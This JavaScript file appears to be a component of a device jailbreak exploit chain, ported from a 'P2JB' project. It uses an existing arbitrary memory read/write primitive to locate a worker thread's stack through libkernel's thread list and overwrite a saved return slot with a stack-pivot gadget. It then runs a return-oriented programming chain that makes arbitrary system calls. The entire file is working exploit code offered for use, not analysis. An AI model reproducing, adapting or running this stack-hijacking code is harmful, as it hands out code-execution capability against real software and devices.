/*
 * Focused SlopKit port of soniciso1/P2JB rop-worker.js at
 * 9966b9176ce2592e1ea6808c7288b7d78c6713cc.
 * Only the single synchronous syscall path is retained.
 */
(function (global) {
    "use strict";

    const WORKER_STACK_SIZE = 0x80000n;
    const STACK_SCAN_BYTES = 0x8000n;
    const CALL_RESERVE = 0x10000n;
    const CHAIN_CAP = 0x380;
    const JMPBUF_SIZE = 0x48n;
    const JB_RIP = 0n;
    const JB_RSP = 0x10n;
    const DONE_MAGIC = 0x5A17C0DEF00D1234n;
    const MAX_PARK_SPINS = 4000000;
    const MAX_CALL_SPINS = 20000000;
    const STABLE_SAMPLES = 8;

    function create(memory, profile, worker) {
        if (!memory || !profile || !worker)
            throw new Error("rop-worker: memory, profile and worker required");

        const lk = profile.lk;
        const gadgets = memory.gadgets;
        const kbase = BigInt(memory.bases.libkernel);
        const state = {
            ready: false,
            dead: false,
            worker,
            stack: 0n,
            slot: 0n,
            pristineRet: undefined,
            pristineNext: undefined,
            fired: 0,
        };

        function mark(tag, detail) {
            const fn = memory.context && memory.context.mark;
            if (typeof fn === "function") fn(tag, detail);
        }

        function g(name) {
            if (name === "syscallWrapper") return kbase + lk.syscallWrapper;
            if (name === "setjmp") return kbase + lk.setjmp;
            if (name === "longjmp") return kbase + lk.longjmp;
            const value = gadgets[name];
            if (value === undefined)
                throw new Error("rop-worker: gadget missing: " + name);
            return BigInt(value);
        }

        function Chain() {
            this.qwords = [];
        }
        Chain.prototype.raw = function (value) {
            this.qwords.push(BigInt(value));
            return this;
        };
        Chain.prototype.pop = function (register, value) {
            const names = {
                rax: "popRax", rdi: "popRdi", rsi: "popRsi",
                rdx: "popRdx", rcx: "popRcx", r8: "popR8", r9: "popR9",
            };
            return this.raw(g(names[register])).raw(value);
        };
        Chain.prototype.call = function (address) {
            return this.raw(address);
        };
        Chain.prototype.store = function (address, value) {
            return this.pop("rax", value).pop("rdi", address)
                .raw(g("movQwordRdiRax"));
        };
        Chain.prototype.commit = function (address) {
            const bytes = this.qwords.length * 8;
            if (bytes > CHAIN_CAP)
                throw new Error("rop-worker: chain exceeds cap");
            for (let i = 0; i < this.qwords.length; ++i)
                memory.write64(address + BigInt(i * 8), this.qwords[i]);
            return address;
        };

        const scratch = memory.malloc(0x12000);
        const chainBuffer = scratch + CALL_RESERVE;
        const contextAddress = chainBuffer + BigInt(CHAIN_CAP) + 0x100n;
        const returnAddress = contextAddress + JMPBUF_SIZE;
        const doneAddress = returnAddress + 8n;
        state.scratch = scratch;
        state.chainBuffer = chainBuffer;
        state.contextAddress = contextAddress;
        state.returnAddress = returnAddress;
        state.doneAddress = doneAddress;

        function buildSyscallChain(number, args, resultAddress) {
            if (!Array.isArray(args) || args.length > 6)
                throw new Error("rop-worker: at most six syscall arguments");
            const registers = ["rdi", "rsi", "rdx", "rcx", "r8", "r9"];
            const chain = new Chain();
            for (let i = 0; i < args.length; ++i) {
                if (args[i] !== undefined)
                    chain.pop(registers[i], BigInt(args[i]));
            }
            chain.pop("rax", BigInt(number)).call(g("syscallWrapper"));
            chain.pop("rdi", BigInt(resultAddress)).raw(g("movQwordRdiRax"));
            return chain.qwords;
        }

        function enumerateWorkerStacks() {
            const stacks = [];
            let thread = memory.read64(kbase + lk.threadList);
            for (let count = 0; thread !== 0n && count < 64; ++count) {
                if (thread < 0x100000000n || (thread & 7n) !== 0n)
                    throw new Error("rop-worker: invalid thread-list node");
                const stack = memory.read64(thread + lk.pthreadStack);
                const size = memory.read64(thread + lk.pthreadStackSize);
                if (size === WORKER_STACK_SIZE)
                    stacks.push(stack);
                thread = memory.read64(thread + lk.pthreadNext);
            }
            return stacks;
        }

        function findWorkerStack() {
            const stacks = enumerateWorkerStacks();
            if (stacks.length !== 1)
                throw new Error("rop-worker: expected one 0x80000 worker stack, got "
                    + stacks.length);
            state.stack = stacks[0];
            mark("P2JB-WORKER-STACK", "address=0x" + state.stack.toString(16));
            return state.stack;
        }

        function resolveSlot() {
            const top = state.stack + WORKER_STACK_SIZE;
            const low = top - STACK_SCAN_BYTES;
            const wanted = kbase + lk.slotExpect;
            const matches = [];
            for (let address = top - 8n; address >= low; address -= 8n) {
                if (memory.read64(address) !== wanted) continue;
                const savedRbp = memory.read64(address - 8n);
                if (savedRbp > address && savedRbp < top
                    && (savedRbp & 7n) === 0n)
                    matches.push(address);
            }
            if (matches.length !== 1)
                throw new Error("rop-worker: parked slot validation count="
                    + matches.length);
            state.slot = matches[0];
            mark("P2JB-WORKER-SLOT", "address=0x" + state.slot.toString(16));
            return state.slot;
        }

        function ping() {
            return new Promise(function (resolve, reject) {
                const timeout = setTimeout(function () {
                    reject(new Error("rop-worker: worker ping timeout"));
                }, 4000);
                worker.onmessage = function () {
                    clearTimeout(timeout);
                    resolve();
                };
                worker.postMessage(0);
            });
        }

        async function initialize() {
            await ping();
            findWorkerStack();
            resolveSlot();
            state.ready = true;
            mark("P2JB-WORKER-READY", "slot-validated=true");
            return state;
        }

        function wrappedChain(payloadQwords) {
            const chain = new Chain();
            chain.pop("rdi", contextAddress).call(g("setjmp"));
            for (const value of payloadQwords) chain.raw(value);
            chain.store(doneAddress, DONE_MAGIC);
            chain.store(contextAddress + JB_RIP, state.pristineRet);
            chain.store(contextAddress + JB_RSP, state.slot);
            chain.store(state.slot + 8n, state.pristineNext);
            chain.pop("rdi", contextAddress).pop("rsi", 1n).call(g("longjmp"));
            return chain;
        }

        function waitForParkedFrame() {
            const wanted = kbase + lk.slotExpect;
            if (state.pristineNext === undefined) {
                let parked = false;
                for (let i = 0; i < MAX_PARK_SPINS; ++i) {
                    if (memory.read64(state.slot) === wanted) {
                        parked = true;
                        break;
                    }
                }
                if (!parked)
                    throw new Error("rop-worker: worker not parked for capture");
                state.pristineRet = memory.read64(state.slot);
                state.pristineNext = memory.read64(state.slot + 8n);
            }

            let stable = 0;
            for (let i = 0; i < MAX_PARK_SPINS; ++i) {
                if (memory.read64(state.slot) === state.pristineRet
                    && memory.read64(state.slot + 8n) === state.pristineNext) {
                    if (++stable >= STABLE_SAMPLES) return;
                } else {
                    stable = 0;
                }
            }
            throw new Error("rop-worker: parked frame did not stabilize");
        }

        function syscallSync(number, ...args) {
            if (!state.ready) throw new Error("rop-worker: initialize first");
            if (state.dead) throw new Error("rop-worker: executor is dead");
            waitForParkedFrame();

            memory.write64(returnAddress, 0n);
            memory.write64(doneAddress, 0n);
            const payload = buildSyscallChain(number, args, returnAddress);
            wrappedChain(payload).commit(chainBuffer);

            worker.onmessage = function () {};
            memory.write64(state.slot, g("popRsp"));
            memory.write64(state.slot + 8n, chainBuffer);
            worker.postMessage(0);

            for (let spins = 0; spins < MAX_CALL_SPINS; ++spins) {
                if (memory.read64(doneAddress) === DONE_MAGIC) {
                    state.fired++;
                    return { retval: memory.read64(returnAddress), spins };
                }
            }

            state.dead = true;
            mark("P2JB-WORKER-TIMEOUT", "executor-latched-dead=true");
            throw new Error("rop-worker: syscall timeout; executor is dead");
        }

        return Object.freeze({
            state,
            initialize,
            buildSyscallChain,
            syscallSync,
            enumerateWorkerStacks,
        });
    }

    global.P2JBRopWorker = Object.freeze({ create });
})(window);
